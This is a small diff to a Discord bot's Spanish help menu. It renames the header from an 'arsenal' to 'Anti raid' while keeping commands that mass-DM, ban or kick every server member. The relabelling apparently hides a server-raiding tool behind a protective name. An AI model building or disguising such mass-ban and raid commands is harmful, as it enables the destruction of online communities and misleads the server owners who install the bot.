@@ -266,7 +266,7 @@ async def ping(ctx):
 async def ayuda(ctx):
     menu = (
         "```\n"
-        "=== Mc R ENGINE V2 - ARSENAL ACTUALIZADO ===\n"
+        "=== Mc R Anti raid - cmds ===\n"
         "!ping         -> Muestra la velocidad de respuesta actual.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
